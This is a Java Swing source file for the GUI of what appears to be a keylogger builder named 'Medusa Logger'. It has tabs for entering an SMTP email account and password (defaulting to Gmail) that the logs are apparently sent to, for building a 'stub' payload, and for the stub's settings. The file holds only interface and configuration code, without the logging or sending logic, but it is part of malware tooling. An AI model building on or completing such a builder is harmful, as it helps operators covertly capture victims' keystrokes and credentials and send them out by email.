 package net.lotusdev.medusa.client;
 
 import java.awt.EventQueue;
 import java.awt.Toolkit;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
 
 import javax.swing.DefaultComboBoxModel;
 import javax.swing.GroupLayout;
 import javax.swing.GroupLayout.Alignment;
 import javax.swing.ImageIcon;
 import javax.swing.JButton;
 import javax.swing.JComboBox;
 import javax.swing.JFrame;
 import javax.swing.JLabel;
 import javax.swing.JMenu;
 import javax.swing.JMenuBar;
 import javax.swing.JMenuItem;
 import javax.swing.JPanel;
 import javax.swing.JPasswordField;
 import javax.swing.JScrollPane;
 import javax.swing.JSeparator;
 import javax.swing.JSpinner;
 import javax.swing.JTabbedPane;
 import javax.swing.JTextField;
 import javax.swing.JTree;
 import javax.swing.LayoutStyle.ComponentPlacement;
 import javax.swing.UIManager;
 import javax.swing.border.EmptyBorder;
 import javax.swing.border.TitledBorder;
 import javax.swing.event.TreeSelectionEvent;
 import javax.swing.event.TreeSelectionListener;
 import javax.swing.tree.DefaultMutableTreeNode;
 import javax.swing.tree.DefaultTreeModel;
 
import net.lotusdev.cryptex.gui.tree.CustomTreeCellNodes;
import net.lotusdev.cryptex.gui.tree.CustomTreeCellRenderer;
 import net.lotusdev.medusa.client.panels.PanelEmail;
 import net.lotusdev.medusa.client.panels.PanelTimeout;
import java.awt.CardLayout;
 
 /**
  * Main.java
  * @author Jabaar
  *
  */
 
 public class Main extends JFrame {
 
 	private JPanel contentPane;
 	private JTextField textField;
 	private JTextField textField_2;
 	private JTextField textField_3;
 	private JPasswordField passwordField;
 	private JTree tree;
 	public static String curTitle = "Email";
 
 	/**
 	 * Launch the application.
 	 */
 	public static void main(String[] args) {
 		EventQueue.invokeLater(new Runnable() {
 			public void run() {
 				try {
 					Builder.readConfig();
 					changeLookAndFeel();
 					Main frame = new Main();
 					frame.setVisible(true);
 				}catch(Exception e) {
 					e.printStackTrace();
 				}
 			}
 		});
 	}
 
 	/**
 	 * Create the frame.
 	 */
 	public Main() {
 		setIconImage(Toolkit.getDefaultToolkit().getImage(Main.class.getResource("/net/lotusdev/medusa/client/res/keyboard.png")));
 		setTitle("Medusa Logger (v" + getVersion() + ")");
 		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
 		setBounds(100, 100, 488, 317);
 		
 		JMenuBar menuBar = new JMenuBar();
 		setJMenuBar(menuBar);
 		
 		JMenu mnMain = new JMenu("Client");
 		menuBar.add(mnMain);
 		
 		JMenuItem mntmSettings = new JMenuItem("Settings");
 		mntmSettings.setIcon(new ImageIcon(Main.class.getResource("/net/lotusdev/medusa/client/res/cog.png")));
 		mnMain.add(mntmSettings);
 		
 		JSeparator separator = new JSeparator();
 		mnMain.add(separator);
 		
 		JMenuItem mntmExit = new JMenuItem("Exit");
 		mntmExit.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
 				System.exit(0);
 			}
 		});
 		mntmExit.setIcon(new ImageIcon(Main.class.getResource("/net/lotusdev/medusa/client/res/door_open.png")));
 		mnMain.add(mntmExit);
 		contentPane = new JPanel();
 		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
 		setContentPane(contentPane);
 		
 		JTabbedPane tabbedPane = new JTabbedPane(JTabbedPane.TOP);
 		GroupLayout gl_contentPane = new GroupLayout(contentPane);
 		gl_contentPane.setHorizontalGroup(
 			gl_contentPane.createParallelGroup(Alignment.LEADING)
 				.addComponent(tabbedPane, GroupLayout.DEFAULT_SIZE, 462, Short.MAX_VALUE)
 		);
 		gl_contentPane.setVerticalGroup(
 			gl_contentPane.createParallelGroup(Alignment.LEADING)
 				.addComponent(tabbedPane)
 		);
 		
 		JPanel panel = new JPanel();
 		tabbedPane.addTab("Email Setup", new ImageIcon(Main.class.getResource("res/page_white_text.png")), panel, null);
 		
 		JPanel panel_3 = new JPanel();
 		panel_3.setBorder(new TitledBorder(null, "Email Settings", TitledBorder.LEADING, TitledBorder.TOP, null, null));
 		GroupLayout gl_panel = new GroupLayout(panel);
 		gl_panel.setHorizontalGroup(
 			gl_panel.createParallelGroup(Alignment.LEADING)
 				.addComponent(panel_3, GroupLayout.PREFERRED_SIZE, 306, Short.MAX_VALUE)
 		);
 		gl_panel.setVerticalGroup(
 			gl_panel.createParallelGroup(Alignment.LEADING)
 				.addComponent(panel_3, GroupLayout.DEFAULT_SIZE, 210, Short.MAX_VALUE)
 		);
 		
 		final JSpinner spinner_1 = new JSpinner();
 		
 		JLabel lblTimeoutminutes = new JLabel("Timeout(minutes):");
 		
 		final JSpinner spinner = new JSpinner();
 		
 		JLabel lblSmtpPort = new JLabel("SMTP Port:");
 		
 		JLabel lblSmtpHost = new JLabel("SMTP Host:");
 		
 		final JComboBox comboBox = new JComboBox();
 		comboBox.setModel(new DefaultComboBoxModel(new String[] {"smtp.gmail.com"}));
 		comboBox.setEditable(true);
 		
 		passwordField = new JPasswordField();
 		
 		JLabel lblPassword = new JLabel("Password:");
 		
 		JLabel lblEmail = new JLabel("Email:");
 		
 		textField = new JTextField();
 		textField.setColumns(10);
 		
 		JButton btnSave = new JButton("Save");
 		btnSave.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
 				Builder.setEmailUser(textField.getText());
 				Builder.setEmailPass(passwordField.getText());
 				Builder.setEmailHost(String.valueOf(comboBox.getSelectedItem()));
 				Builder.setEmailPort(String.valueOf(spinner.getValue()));
 				Builder.setTimeout((Integer)spinner_1.getValue());
 				Builder.writeConfig();
 			}
 		});
 		btnSave.setIcon(new ImageIcon(Main.class.getResource("/net/lotusdev/medusa/client/res/accept.png")));
 		GroupLayout gl_panel_3 = new GroupLayout(panel_3);
 		gl_panel_3.setHorizontalGroup(
 			gl_panel_3.createParallelGroup(Alignment.LEADING)
 				.addGroup(gl_panel_3.createSequentialGroup()
 					.addContainerGap()
 					.addGroup(gl_panel_3.createParallelGroup(Alignment.LEADING)
 						.addComponent(btnSave, Alignment.TRAILING)
 						.addGroup(gl_panel_3.createSequentialGroup()
 							.addGroup(gl_panel_3.createParallelGroup(Alignment.LEADING)
 								.addGroup(gl_panel_3.createSequentialGroup()
 									.addComponent(lblSmtpPort, GroupLayout.PREFERRED_SIZE, 55, GroupLayout.PREFERRED_SIZE)
 									.addGap(10)
 									.addComponent(spinner, GroupLayout.PREFERRED_SIZE, 53, GroupLayout.PREFERRED_SIZE)
 									.addPreferredGap(ComponentPlacement.RELATED, 12, Short.MAX_VALUE)
 									.addComponent(lblTimeoutminutes)
 									.addPreferredGap(ComponentPlacement.RELATED)
 									.addComponent(spinner_1, GroupLayout.PREFERRED_SIZE, 53, GroupLayout.PREFERRED_SIZE))
 								.addGroup(gl_panel_3.createSequentialGroup()
 									.addComponent(lblSmtpHost)
 									.addGap(10)
 									.addComponent(comboBox, 0, 209, Short.MAX_VALUE))
 								.addGroup(gl_panel_3.createSequentialGroup()
 									.addGroup(gl_panel_3.createParallelGroup(Alignment.LEADING)
 										.addComponent(lblPassword)
 										.addComponent(lblEmail))
 									.addGap(15)
 									.addGroup(gl_panel_3.createParallelGroup(Alignment.LEADING)
 										.addComponent(passwordField, GroupLayout.DEFAULT_SIZE, 209, Short.MAX_VALUE)
 										.addComponent(textField, GroupLayout.DEFAULT_SIZE, 209, Short.MAX_VALUE))))
 							.addContainerGap())))
 		);
 		gl_panel_3.setVerticalGroup(
 			gl_panel_3.createParallelGroup(Alignment.TRAILING)
 				.addGroup(gl_panel_3.createSequentialGroup()
 					.addGroup(gl_panel_3.createParallelGroup(Alignment.BASELINE)
 						.addComponent(textField, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
 						.addComponent(lblEmail))
 					.addGap(6)
 					.addGroup(gl_panel_3.createParallelGroup(Alignment.BASELINE)
 						.addComponent(lblPassword)
 						.addComponent(passwordField, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
 					.addGroup(gl_panel_3.createParallelGroup(Alignment.LEADING)
 						.addGroup(gl_panel_3.createSequentialGroup()
 							.addGap(9)
 							.addComponent(lblSmtpHost))
 						.addGroup(gl_panel_3.createSequentialGroup()
 							.addPreferredGap(ComponentPlacement.RELATED)
 							.addComponent(comboBox, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)))
 					.addPreferredGap(ComponentPlacement.RELATED)
 					.addGroup(gl_panel_3.createParallelGroup(Alignment.LEADING)
 						.addGroup(gl_panel_3.createSequentialGroup()
 							.addGap(3)
 							.addComponent(lblSmtpPort))
 						.addGroup(gl_panel_3.createParallelGroup(Alignment.BASELINE)
 							.addComponent(spinner, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
 							.addComponent(spinner_1, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
 							.addComponent(lblTimeoutminutes)))
 					.addPreferredGap(ComponentPlacement.RELATED, 72, Short.MAX_VALUE)
 					.addComponent(btnSave))
 		);
 		panel_3.setLayout(gl_panel_3);
 		panel.setLayout(gl_panel);
 		
 		JPanel panel_1 = new JPanel();
 		tabbedPane.addTab("Build Stub", new ImageIcon(Main.class.getResource("res/application_edit.png")), panel_1, null);
 		
 		JPanel panel_2 = new JPanel();
 		panel_2.setBorder(new TitledBorder(null, "Output", TitledBorder.LEADING, TitledBorder.TOP, null, null));
 		GroupLayout gl_panel_1 = new GroupLayout(panel_1);
 		gl_panel_1.setHorizontalGroup(
 			gl_panel_1.createParallelGroup(Alignment.LEADING)
 				.addComponent(panel_2, GroupLayout.PREFERRED_SIZE, 306, Short.MAX_VALUE)
 		);
 		gl_panel_1.setVerticalGroup(
 			gl_panel_1.createParallelGroup(Alignment.LEADING)
 				.addComponent(panel_2, GroupLayout.DEFAULT_SIZE, 209, Short.MAX_VALUE)
 		);
 		
 		JLabel lblLocation = new JLabel("Location:");
 		
 		JLabel lblName = new JLabel("Name:");
 		
 		textField_2 = new JTextField();
 		textField_2.setColumns(10);
 		
 		textField_3 = new JTextField();
 		textField_3.setColumns(10);
 		
 		JButton button = new JButton("...");
 		
 		JButton btnBuild = new JButton("Build");
 		btnBuild.setIcon(new ImageIcon(Main.class.getResource("/net/lotusdev/medusa/client/res/application_go.png")));
 		
 		JButton btnFiles = new JButton("Files");
 		btnFiles.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
 				EstimateClasses estClasses = new EstimateClasses();
 				estClasses.setVisible(true);
 			}
 		});
 		btnFiles.setIcon(new ImageIcon(Main.class.getResource("/net/lotusdev/medusa/client/res/page_white_stack.png")));
 		GroupLayout gl_panel_2 = new GroupLayout(panel_2);
 		gl_panel_2.setHorizontalGroup(
 			gl_panel_2.createParallelGroup(Alignment.LEADING)
 				.addGroup(gl_panel_2.createSequentialGroup()
 					.addContainerGap()
 					.addGroup(gl_panel_2.createParallelGroup(Alignment.LEADING)
 						.addGroup(gl_panel_2.createSequentialGroup()
 							.addGroup(gl_panel_2.createParallelGroup(Alignment.LEADING)
 								.addComponent(lblName)
 								.addComponent(lblLocation))
 							.addGap(21)
 							.addGroup(gl_panel_2.createParallelGroup(Alignment.LEADING)
 								.addGroup(gl_panel_2.createSequentialGroup()
 									.addComponent(textField_3, GroupLayout.DEFAULT_SIZE, 158, Short.MAX_VALUE)
 									.addPreferredGap(ComponentPlacement.RELATED)
 									.addComponent(button))
 								.addComponent(textField_2, GroupLayout.DEFAULT_SIZE, 209, Short.MAX_VALUE))
 							.addContainerGap())
 						.addGroup(Alignment.TRAILING, gl_panel_2.createSequentialGroup()
 							.addComponent(btnFiles)
 							.addPreferredGap(ComponentPlacement.RELATED)
 							.addComponent(btnBuild))))
 		);
 		gl_panel_2.setVerticalGroup(
 			gl_panel_2.createParallelGroup(Alignment.LEADING)
 				.addGroup(gl_panel_2.createSequentialGroup()
 					.addGroup(gl_panel_2.createParallelGroup(Alignment.LEADING)
 						.addGroup(gl_panel_2.createSequentialGroup()
 							.addGap(3)
 							.addComponent(lblName)
 							.addGap(9)
 							.addGroup(gl_panel_2.createParallelGroup(Alignment.BASELINE)
 								.addComponent(lblLocation)
 								.addComponent(textField_3, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
 								.addComponent(button)))
 						.addComponent(textField_2, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
 					.addPreferredGap(ComponentPlacement.RELATED, 112, Short.MAX_VALUE)
 					.addGroup(gl_panel_2.createParallelGroup(Alignment.BASELINE)
 						.addComponent(btnBuild)
 						.addComponent(btnFiles)))
 		);
 		panel_2.setLayout(gl_panel_2);
 		panel_1.setLayout(gl_panel_1);
 		contentPane.setLayout(gl_contentPane);
 		
 		/**
 		 * Set text of fields after being read drom config file.
 		 */
 		textField.setText(Builder.getEmailUser());
 		passwordField.setText(Builder.getEmailPass());
 		comboBox.setSelectedItem(String.valueOf(Builder.getEmailHost()));
 		//spinner.setValue(Integer.parseInt(Builder.getEmailPort()));
 		spinner_1.setValue((Integer)Builder.getTimeout());
 		
 		JPanel panel_4 = new JPanel();
 		tabbedPane.addTab("Stub Settings", null, panel_4, null);
 		
 		JScrollPane scrollPane = new JScrollPane();
 		
 		final JPanel panel_5 = new JPanel(new CardLayout());
 		panel_5.setBorder(new TitledBorder(null, curTitle, TitledBorder.LEADING, TitledBorder.TOP, null, null));
 		GroupLayout gl_panel_4 = new GroupLayout(panel_4);
 		gl_panel_4.setHorizontalGroup(
 			gl_panel_4.createParallelGroup(Alignment.LEADING)
 				.addGroup(gl_panel_4.createSequentialGroup()
 					.addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 136, GroupLayout.PREFERRED_SIZE)
 					.addGap(2)
 					.addComponent(panel_5, GroupLayout.DEFAULT_SIZE, 319, Short.MAX_VALUE))
 		);
 		gl_panel_4.setVerticalGroup(
 			gl_panel_4.createParallelGroup(Alignment.LEADING)
 				.addGroup(gl_panel_4.createParallelGroup(Alignment.BASELINE)
 					.addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 218, GroupLayout.PREFERRED_SIZE)
 					.addComponent(panel_5, GroupLayout.DEFAULT_SIZE, 205, Short.MAX_VALUE))
 		);
 		
 		CustomTreeCellNodes.makeTreeIcons();
 		
 		tree = new JTree();
 		tree.setShowsRootHandles(false);
 		tree.setModel(new DefaultTreeModel(new DefaultMutableTreeNode("Settings")));
 		
 		for (int i  = 0; i < CustomTreeCellNodes.getTreeIcons().size(); i++) {
 			DefaultMutableTreeNode node = (DefaultMutableTreeNode)getTreeModel().getRoot();
 
 			node.add(new DefaultMutableTreeNode(CustomTreeCellNodes.getTreeIcons().get(i)));
 		}
 		
 		expand();
 		
 		final PanelEmail p_email = new PanelEmail();
 		final PanelTimeout p_timeout = new PanelTimeout();
 
 		tree.setCellRenderer(new CustomTreeCellRenderer());
 		tree.addTreeSelectionListener(new TreeSelectionListener() {
 			public void valueChanged(TreeSelectionEvent arg0) {
 				try {
 					DefaultMutableTreeNode node = (DefaultMutableTreeNode)arg0.getNewLeadSelectionPath().getLastPathComponent();
 
 					if (node != null) {
 						curTitle = node.toString();
 						panel_5.setBorder(new TitledBorder(null, curTitle, TitledBorder.LEADING, TitledBorder.TOP, null, null));
 						
 						if(node.toString().equals("Email")) {
 							panel_5.add(p_email);
 							panel_5.remove(p_timeout);
 						}else if(node.toString().equals("Timeout")) {
 							panel_5.add(p_timeout);
 							panel_5.remove(p_email);
 						}
 						
 						System.out.println(node.toString());
 					}
 				} catch (Exception ex) {
 					ex.printStackTrace();
 				}
 			}
 		});
 		scrollPane.setViewportView(tree);
 		panel_4.setLayout(gl_panel_4);
 	}
 	
 	public static void changeLookAndFeel() {
 		try {
 			UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
 		}catch(Exception e) {
 			
 		}
 	}
 	
 	public void expand() {
 		tree.expandRow(0);
 	}
 
 	public static String getVersion() {
 		return "0.8_5";
 	}
 	
 	public DefaultTreeModel getTreeModel() {
 		return (DefaultTreeModel)tree.getModel();
 	}
 }
